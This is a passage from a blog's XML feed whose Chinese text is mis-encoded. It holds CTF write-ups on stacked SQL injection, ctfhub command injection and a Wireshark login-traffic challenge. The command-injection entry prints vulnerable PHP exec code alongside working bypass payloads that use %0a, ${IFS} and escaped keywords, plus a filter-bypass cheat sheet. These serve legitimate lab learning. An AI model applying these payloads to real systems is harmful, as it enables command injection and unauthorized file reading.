        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å æ³¨å…¥</title>
      <link href="2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>å°†åŸæ¥çš„è¯­å¥æ„é€ å®ŒååŠ ä¸Šåˆ†å·ï¼Œä»£è¡¨è¯¥è¯­å¥ç»“æŸï¼Œåé¢å†è¾“å…¥çš„å°±æ˜¯æ–°çš„sqlè¯­å¥ã€‚</p><h2 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h2><p>å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶æœ‰é™ã€‚åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œæ¯”å¦‚phpä¸­çš„mysqli_multi_query()å‡½æ•°ã€‚<br>sql=â€select * from flag where id=$_POST[â€˜idâ€™]â€;<br>åˆ™å¯æ„é€ :<br>1;select * from flag<br>ç»ƒä¹ é¢˜ï¼šBUUCTF [SUCTF 2019]EasySQL</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ³¨å…¥ç»•è¿‡&amp;URLè§£æ</title>
      <link href="2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/"/>
      <url>2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢˜ç›®ç¯å¢ƒï¼šctfhub-ç»¼åˆå‘½ä»¤æ³¨å…¥"><a href="#é¢˜ç›®ç¯å¢ƒï¼šctfhub-ç»¼åˆå‘½ä»¤æ³¨å…¥" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼šctfhub-ç»¼åˆå‘½ä»¤æ³¨å…¥"></a>é¢˜ç›®ç¯å¢ƒï¼šctfhub-ç»¼åˆå‘½ä»¤æ³¨å…¥</h1><p>è‡´æ•¬ã€å‚è€ƒï¼š<a href="https://blog.csdn.net/lusanshui/article/details/86492410?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">å›è½¦&amp;æ¢è¡Œ</a></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡é˜…è¯»æºç å‘ç°ï¼Œè¿‡æ»¤äº†| &amp; ; ç©ºæ ¼ / cat flag ctfhubè¿™å‡ ä¸ªå…³é”®å­—ã€‚ä¸ç»•è¿‡çš„è¯æ ¹æœ¬æ—¥ä¸è¿›å»ã€‚æ¥ä¸‹æ¥è€ƒè™‘ç»•è¿‡<br>é¦–å…ˆå…ˆlsä¸€ä¸‹çœ‹çœ‹é‡Œé¢æœ‰å•¥ã€‚æƒ³lsï¼Œé¦–å…ˆè¦æŠŠåˆ†éš”ç¬¦ç»•è¿‡äº†æ‰èƒ½lsã€‚è¿™é‡Œé‡‡ç”¨URLç¼–ç ,å³%0aä»£è¡¨æ¢è¡Œç¬¦ã€‚å°è¯•ï¼š<img src="/img/rc1.png"><br>æˆåŠŸã€‚æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯æŸ¥çœ‹flag_is_hereæ–‡ä»¶å¤¹æœ‰å•¥ã€‚ï¼ˆæˆ–è®¸ä¸æ˜¯æ–‡ä»¶å¤¹ï¼‰<br>è¿™é‡Œç”±äºè¿‡æ»¤äº†flagå­—æ®µå’Œç©ºæ ¼ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨fl\agè¿™ç§å½¢å¼ç»•è¿‡flagï¼Œé‡‡ç”¨${IFS}ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚payload:ip=127.0.0.1%0als${IFS}fl\ag_is_here<br>ä¹‹åå¾—åˆ°ç»“æœflag_5145112918545.phpã€‚ä¸‹ä¸€æ­¥å°±åº”è¯¥åº·åº·è¿™é‡Œé¢æœ‰ä»€ä¹ˆäº†ã€‚å‡è®¾å½“å‰ç›®å½•ä¸º/ï¼Œæˆ‘ä»¬éœ€è¦è¯»å–/flag_is_here/flag_5145112918545.phpæ–‡ä»¶çš„å†…å®¹ã€‚<br>ç»§ç»­åˆ†æã€‚ç”±äºè¿‡æ»¤äº†è·¯å¾„åˆ†éš”ç¬¦\ï¼Œè€ƒè™‘é‡‡ç”¨ç»¼åˆå‘½ä»¤ï¼šå…ˆcdè¿›å…¥flag_is_hereæ–‡ä»¶å¤¹ï¼Œç„¶åcat flag_5145112918545.phpæ–‡ä»¶ï¼Œå½“ç„¶ï¼Œé’ˆå¯¹catçš„ç»•è¿‡æœ‰å¾ˆå¤šæ–¹æ³• æ¯”å¦‚ca\t æˆ–è€…ç›´æ¥sort flag_5145112918545.php<br>payload:ip=127.0.0.1%0acd${IFS}fl\ag_is_here%0aca\t${IFS}fl\ag_5145112918545.php<br>æˆ–è€…æŠŠca\tæ¢æˆsortã€‚ä¸€æ ·</p><h2 id="æ³¨æ„å†…å®¹ï¼šè¿™é‡Œæ¢è¡Œç¬¦éœ€è¦æ³¨æ„ã€‚æ¢è¡Œç¬¦çš„URLç¼–ç ä¸º-0a-é‡‡ç”¨GETæ–¹å¼ã€‚æ‰€ä»¥éœ€è¦ä½ ç›´æ¥ä½¿ç”¨GETæ–¹å¼æäº¤æ•°æ®ï¼Œè€Œä¸èƒ½åœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®ã€‚å› ä¸ºåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlencode-çš„è¿‡ç¨‹ï¼Œä¼šæŠŠ-0aå†æ¬¡urlç¼–ç æˆåˆ«çš„ã€‚è¿™å°±ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†ã€‚æ‰€ä»¥å¯ä»¥ç”¨hackbaræˆ–è€…burpç›´æ¥ç”¨getæ–¹å¼æäº¤ã€‚"><a href="#æ³¨æ„å†…å®¹ï¼šè¿™é‡Œæ¢è¡Œç¬¦éœ€è¦æ³¨æ„ã€‚æ¢è¡Œç¬¦çš„URLç¼–ç ä¸º-0a-é‡‡ç”¨GETæ–¹å¼ã€‚æ‰€ä»¥éœ€è¦ä½ ç›´æ¥ä½¿ç”¨GETæ–¹å¼æäº¤æ•°æ®ï¼Œè€Œä¸èƒ½åœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®ã€‚å› ä¸ºåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlencode-çš„è¿‡ç¨‹ï¼Œä¼šæŠŠ-0aå†æ¬¡urlç¼–ç æˆåˆ«çš„ã€‚è¿™å°±ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†ã€‚æ‰€ä»¥å¯ä»¥ç”¨hackbaræˆ–è€…burpç›´æ¥ç”¨getæ–¹å¼æäº¤ã€‚" class="headerlink" title="æ³¨æ„å†…å®¹ï¼šè¿™é‡Œæ¢è¡Œç¬¦éœ€è¦æ³¨æ„ã€‚æ¢è¡Œç¬¦çš„URLç¼–ç ä¸º%0a,é‡‡ç”¨GETæ–¹å¼ã€‚æ‰€ä»¥éœ€è¦ä½ ç›´æ¥ä½¿ç”¨GETæ–¹å¼æäº¤æ•°æ®ï¼Œè€Œä¸èƒ½åœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®ã€‚å› ä¸ºåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlencode()çš„è¿‡ç¨‹ï¼Œä¼šæŠŠ%0aå†æ¬¡urlç¼–ç æˆåˆ«çš„ã€‚è¿™å°±ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†ã€‚æ‰€ä»¥å¯ä»¥ç”¨hackbaræˆ–è€…burpç›´æ¥ç”¨getæ–¹å¼æäº¤ã€‚"></a>æ³¨æ„å†…å®¹ï¼šè¿™é‡Œæ¢è¡Œç¬¦éœ€è¦æ³¨æ„ã€‚æ¢è¡Œç¬¦çš„URLç¼–ç ä¸º%0a,é‡‡ç”¨GETæ–¹å¼ã€‚æ‰€ä»¥éœ€è¦ä½ ç›´æ¥ä½¿ç”¨GETæ–¹å¼æäº¤æ•°æ®ï¼Œè€Œä¸èƒ½åœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®ã€‚å› ä¸ºåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlencode()çš„è¿‡ç¨‹ï¼Œä¼šæŠŠ%0aå†æ¬¡urlç¼–ç æˆåˆ«çš„ã€‚è¿™å°±ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†ã€‚æ‰€ä»¥å¯ä»¥ç”¨hackbaræˆ–è€…burpç›´æ¥ç”¨getæ–¹å¼æäº¤ã€‚</h2><h2 id="å¸¸è§å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿"><a href="#å¸¸è§å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å¸¸è§å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿"></a>å¸¸è§å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿</h2><h3 id="å…ˆçœ‹è‡´æ•¬ã€å‚è€ƒé“¾æ¥ä¸­çš„å›è½¦-amp-æ¢è¡Œã€‚"><a href="#å…ˆçœ‹è‡´æ•¬ã€å‚è€ƒé“¾æ¥ä¸­çš„å›è½¦-amp-æ¢è¡Œã€‚" class="headerlink" title="å…ˆçœ‹è‡´æ•¬ã€å‚è€ƒé“¾æ¥ä¸­çš„å›è½¦&amp;æ¢è¡Œã€‚"></a>å…ˆçœ‹è‡´æ•¬ã€å‚è€ƒé“¾æ¥ä¸­çš„å›è½¦&amp;æ¢è¡Œã€‚</h3><p>command1 &amp;&amp; command2 cmd1æˆåŠŸæ‰§è¡Œåæ‰§è¡Œcmd2<br>command1 | command2 åªæ‰§è¡Œcommand2<br>cmd1 || cmd2 cmd1ä¸æˆåŠŸæ‰§è¡Œåˆ™æ‰§è¡Œcmd2<br>command1 &amp; command2 å…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1<br>ç©ºæ ¼ç»•è¿‡ï¼ˆä»¥ã€ä¸ºåˆ†ç•Œï¼‰ï¼š&lt;ã€&lt;&gt;ã€${IFS}ã€$IFS$9<br>$IFS ä»£è¡¨åˆ†éš”ç¬¦ï¼Œ$9ä»£è¡¨å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ä¸­çš„ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚<br>æ¯”å¦‚ï¼šcat ${IFS}filename ===cat $IFS$9filename ===cat filenmae<br>;ç»•è¿‡ï¼š<br>é¦–å…ˆè¦çŸ¥é“;ä»£è¡¨è¿ç»­æŒ‡ä»¤ï¼Œç®€å•åœ°è¯´å°±æ˜¯ç”¨;å¯ä»¥æŠŠå¤šæ¡æŒ‡ä»¤å†™ä¸€è¡Œç„¶ååˆ†åˆ«æ‰§è¡Œã€‚<br>ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨%0aç¼–ç ç»•è¿‡ã€‚<br>åŸç†ï¼š<br>å‡è®¾åŸå‘½ä»¤ä¸ºcmd1;cmd2;cmd3\n<br>ä½¿ç”¨%0aç»•è¿‡åï¼šcmd1%0acmd2%0acmd3%0a  ==&gt;cmd1\ncmd2\ncmd3\n æ³¨æ„ç†è§£æ¢è¡Œç¬¦çš„æ¦‚å¿µã€‚å°±çŸ¥é“ä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥ç»•è¿‡äº†ã€‚ï¼ˆç²—æš´çš„ç†è§£:ä¸€ä¸ª\nå°±ä»£è¡¨\nå‰é¢çš„å‘½ä»¤æ‰§è¡Œä¸€æ¬¡ï¼‰<br>é»‘åå•å­—ç¬¦ç»•è¿‡ï¼š<br>a=fl;b=ag;$a$b  -&gt;flag<br>cat ca\t -&gt;cat<br>æˆ–è€…ç”¨åˆ«çš„æ–¹æ³•ã€‚æ¯”å¦‚å¯ä»¥ç”¨sort/head/tail/strings æ›¿æ¢cat<br>#URLè§£æå…¨è¿‡ç¨‹<br>ä»€ä¹ˆæ˜¯URL<br><a href="https://blog.csdn.net/simplebam/article/details/72644094">åŒºåˆ†URL\URI</a><br>URLç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œç”¨äºäº’è”ç½‘ä¸Šä¸åŒçš„èµ„æºçš„æ ‡è¯†ï¼Œå°±åƒä¸åŒçš„äººæœ‰ä¸åŒçš„èº«ä»½è¯ä¸€æ ·ã€‚<br>URLåŒ…æ‹¬åè®®ã€åŸŸåã€è·¯å¾„ã€å‚æ•°ã€æŸ¥è¯¢ç­‰ã€‚<br>æ¯”å¦‚ï¼š<a href="http://polosec.github.io/index.html">http://polosec.github.io/index.html</a></p><h3 id="URLç¼–ç è§„åˆ™"><a href="#URLç¼–ç è§„åˆ™" class="headerlink" title="URLç¼–ç è§„åˆ™"></a>URLç¼–ç è§„åˆ™</h3><p>Urlç¼–ç é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºç™¾åˆ†å·ç¼–ç ï¼Œç¼–ç æ–¹å¼éå¸¸ç®€å•ï¼Œä½¿ç”¨%ç™¾åˆ†å·åŠ ä¸Šä¸¤ä½çš„å­—ç¬¦â€”â€”0123456789ABCDEFâ€”â€”ä»£è¡¨ä¸€ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶å½¢å¼ã€‚Urlç¼–ç é»˜è®¤ä½¿ç”¨çš„å­—ç¬¦é›†æ˜¯US-ASCIIã€‚ä¾‹å¦‚aåœ¨US-ASCIIç ä¸­å¯¹åº”çš„å­—èŠ‚æ˜¯0x61ï¼Œé‚£ä¹ˆUrlç¼–ç ä¹‹åå¾—åˆ°çš„å°±æ˜¯%61ï¼Œæˆ‘ä»¬åœ¨åœ°å€æ ä¸Šè¾“å…¥ <a href="http://g.cn/search?q=abc">http://g.cn/search?q=%61%62%63</a> ï¼Œå®é™…ä¸Šå°±ç­‰åŒäºåœ¨googleä¸Šæœç´¢abcäº†ã€‚åˆå¦‚@ç¬¦å·åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯¹åº”çš„å­—èŠ‚ä¸º0x40ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°çš„æ˜¯%40ã€‚<br>å¯¹äºéASCIIå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ASCIIå­—ç¬¦é›†çš„è¶…é›†è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¯¹äºUnicodeå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º0xE4 0xB8 0xAD 0xE6 0x96 0x87ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°â€%E4%B8%AD%E6%96%87â€ã€‚</p><h3 id="URLç¼–ç -è§£ç æ—¶é—´èŠ‚ç‚¹"><a href="#URLç¼–ç -è§£ç æ—¶é—´èŠ‚ç‚¹" class="headerlink" title="URLç¼–ç /è§£ç æ—¶é—´èŠ‚ç‚¹"></a>URLç¼–ç /è§£ç æ—¶é—´èŠ‚ç‚¹</h3><p>å‘é€è¯·æ±‚çš„æ—¶å€™å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ç¼–ç ï¼ŒæœåŠ¡å™¨ç«¯æ¥å—åˆ°è¯·æ±‚åä¼šè‡ªåŠ¨è§£ç ï¼›ç„¶åç¼–ç å‘é€ç»™å®¢æˆ·ç«¯ï¼›å®¢æˆ·ç«¯å†è§£ç ã€‚<br>å…³äºäºŒæ¬¡ç¼–ç /äºŒæ¬¡è§£ç çš„é—®é¢˜ï¼š<a href="https://www.cnblogs.com/xzwblog/p/6932870.html">äºŒæ¬¡ç¼–ç &amp;äºŒæ¬¡è§£ç </a>ç”¨æ¥è§£å†³ä¸­æ–‡ç¼–ç åä¹±ç çš„é—®é¢˜</p><h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p>è¾“å…¥URLæŒ‰å›è½¦åï¼Œé¦–å…ˆè¿›è¡Œçš„æ˜¯åŸŸåè§£ææ“ä½œã€‚é¦–å…ˆæŸ¥çœ‹ç¼“å­˜ï¼šä¾æ¬¡æŸ¥æ‰¾æµè§ˆå™¨å†…éƒ¨ç¼“å­˜ã€æœ¬æœºhostsæ–‡ä»¶ã€æœ¬åœ°è·¯ç”±å™¨ç¼“å­˜ã€ç„¶åæ˜¯ISPæä¾›å•†çš„ç¼“å­˜ã€‚<br>å¦‚æœç¼“å­˜éƒ½æ²¡æœ‰çš„è¯ï¼Œåˆ™æœ¬åœ°DNSæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨è¿›è¡Œè¿­ä»£æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åˆ°ç»“æœåè¿”å›ç»™ä¸»æœºã€‚<a href="https://www.cnblogs.com/qingdaofu/p/7399670.html">é€’å½’æŸ¥è¯¢ã€è¿­ä»£æŸ¥è¯¢</a></p><h2 id="è¿›è¡ŒTCPè¿æ¥-ä¸‰æ¬¡æ¡æ‰‹"><a href="#è¿›è¡ŒTCPè¿æ¥-ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="è¿›è¡ŒTCPè¿æ¥(ä¸‰æ¬¡æ¡æ‰‹)"></a>è¿›è¡ŒTCPè¿æ¥(ä¸‰æ¬¡æ¡æ‰‹)</h2><p>è·å–åˆ°æœåŠ¡å™¨IPåœ°å€åï¼Œæµè§ˆå™¨ä¼šä»¥ä¸€ä¸ªéšæœºç«¯å£å‘æœåŠ¡å™¨çš„80(é»˜è®¤)ç«¯å£å‘èµ·TCPè¿æ¥è¯·æ±‚ã€‚</p><h2 id="å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚"><a href="#å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚" class="headerlink" title="å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚"></a>å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚</h2><p>å»ºç«‹è¿æ¥åï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ã€‚è¯·æ±‚åŒ…å«è¯·æ±‚å¤´å’Œè¯·æ±‚æ­£æ–‡ã€‚è¯·æ±‚å¤´ä¸€èˆ¬åŒ…æ‹¬è¯·æ±‚æ–¹æ³•ï¼Œèµ„æºè·¯å¾„ï¼ŒHTTPåè®®ç‰ˆæœ¬ã€cookieã€hostã€acceptç­‰å­—æ®µã€‚è¯·æ±‚æ­£æ–‡åˆ™æ˜¯å®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯ã€‚</p><h2 id="æœåŠ¡å™¨å“åº”HTTPè¯·æ±‚"><a href="#æœåŠ¡å™¨å“åº”HTTPè¯·æ±‚" class="headerlink" title="æœåŠ¡å™¨å“åº”HTTPè¯·æ±‚"></a>æœåŠ¡å™¨å“åº”HTTPè¯·æ±‚</h2><p>HTTPå“åº”åŒ…æ‹¬äº†çŠ¶æ€è¡Œã€å“åº”å¤´ã€å“åº”æ­£æ–‡ã€‚<br>çŠ¶æ€è¡Œæ ‡è¯†äº†httpåè®®ç‰ˆæœ¬ä¸çŠ¶æ€ç ã€‚<br>å“åº”å¤´åŒ…å«äº†ä¸€äº›å­—æ®µã€‚æ¯”å¦‚set-cookie,date,allow,content-encodingç­‰å­—æ®µã€‚ä»¥K:Vå½¢å¼å‡ºç°ã€‚</p><h2 id="æµè§ˆå™¨æ˜¾ç¤ºhtmlé¡µé¢"><a href="#æµè§ˆå™¨æ˜¾ç¤ºhtmlé¡µé¢" class="headerlink" title="æµè§ˆå™¨æ˜¾ç¤ºhtmlé¡µé¢"></a>æµè§ˆå™¨æ˜¾ç¤ºhtmlé¡µé¢</h2><p>1.åŠ è½½è§£æHTMLï¼Œå¼€å§‹æ„å»ºDOMæ ‘ã€‚<br>2.é‡åˆ°CSSå¤–é“¾ï¼Œå¼‚æ­¥åŠ è½½è§£æCSSï¼Œæ„å»ºCSSè§„åˆ™æ ‘ã€‚<br>3.é‡åˆ°scriptæ ‡ç­¾ï¼Œå¦‚æœæ˜¯æ™®é€šJSæ ‡ç­¾åˆ™åŒæ­¥åŠ è½½å¹¶æ‰§è¡Œï¼Œé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œå¦‚æœæ ‡ç­¾ä¸Šæœ‰defer/asyncå±æ€§åˆ™å¼‚æ­¥åŠ è½½JSèµ„æºã€‚è®¾ç½®deferçš„JSèµ„æºä¼šåœ¨DOMContentLoadedäº‹ä»¶ä¹‹å‰æ‰§è¡Œï¼›è®¾ç½®äº†asyncçš„JSèµ„æºåŠ è½½å®Œå°±æ‰§è¡Œã€‚<br>4.åˆå¹¶DOMæ ‘å’ŒCSSè§„åˆ™æ ‘ç”Ÿæˆrenderæ ‘ã€‚<br>5.å¸ƒå±€renderæ ‘ï¼Œè®¡ç®—å„å…ƒç´ çš„å°ºå¯¸ã€ä½ç½®ç­‰ï¼Œåœ¨å†…å­˜ä¸Šç”ŸæˆBitmapã€‚<br>6.æ¸²æŸ“renderæ ‘ï¼Œå°†å†…å­˜ä¸Šçš„Bitmapç»˜åˆ¶åˆ°å±å¹•ä¸Šã€‚</p><h2 id="é¡µé¢åŠ è½½å®Œæˆ"><a href="#é¡µé¢åŠ è½½å®Œæˆ" class="headerlink" title="é¡µé¢åŠ è½½å®Œæˆ"></a>é¡µé¢åŠ è½½å®Œæˆ</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuç™»å½•æµé‡åˆ†æ</title>
      <link href="2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†ï¼šwiresharkåŸºæœ¬æ“ä½œ"><a href="#é¢„å¤‡çŸ¥è¯†ï¼šwiresharkåŸºæœ¬æ“ä½œ" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ï¼šwiresharkåŸºæœ¬æ“ä½œ"></a>é¢„å¤‡çŸ¥è¯†ï¼šwiresharkåŸºæœ¬æ“ä½œ</h1><h2 id="é¢˜ç›®åˆ†æï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ-æ³¨æ„ï¼šå¾—åˆ°çš„-flag-è¯·åŒ…ä¸Š-flag-æäº¤"><a href="#é¢˜ç›®åˆ†æï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ-æ³¨æ„ï¼šå¾—åˆ°çš„-flag-è¯·åŒ…ä¸Š-flag-æäº¤" class="headerlink" title="é¢˜ç›®åˆ†æï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤"></a>é¢˜ç›®åˆ†æï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</h2><p>æ‰“å¼€æ•°æ®åŒ…é¦–å…ˆè€ƒè™‘ç™»å½•é¡µé¢ï¼Œå¾€ä¸‹ç¨å¾®ç¿»äº†ä¸€ä¸‹å°±çœ‹åˆ°äº†ä¸€ä¸ªæ„æ€ç™»å½•é¡µé¢ï¼ˆç¼–å·20ï¼‰ æ˜¯å‘user.phpæäº¤æ•°æ®ï¼Œç›²çŒœç™»é™†ç•Œé¢ã€‚<br>ç„¶åè¿½è¸ªæµ-TCPæµï¼Œå³å¯çœ‹åˆ°å¯†ç ã€‚</p><h2 id="è¿™åº”è¯¥æ˜¯ç¬¬ä¸€é“ç§’çš„é¢˜-å¤ªèœäº†ã€‚"><a href="#è¿™åº”è¯¥æ˜¯ç¬¬ä¸€é“ç§’çš„é¢˜-å¤ªèœäº†ã€‚" class="headerlink" title="è¿™åº”è¯¥æ˜¯ç¬¬ä¸€é“ç§’çš„é¢˜ å¤ªèœäº†ã€‚"></a>è¿™åº”è¯¥æ˜¯ç¬¬ä¸€é“ç§’çš„é¢˜ å¤ªèœäº†ã€‚</h2>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pickleååºåˆ—åŒ–åˆæ­¥å­¦ä¹ </title>
      <link href="2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
      
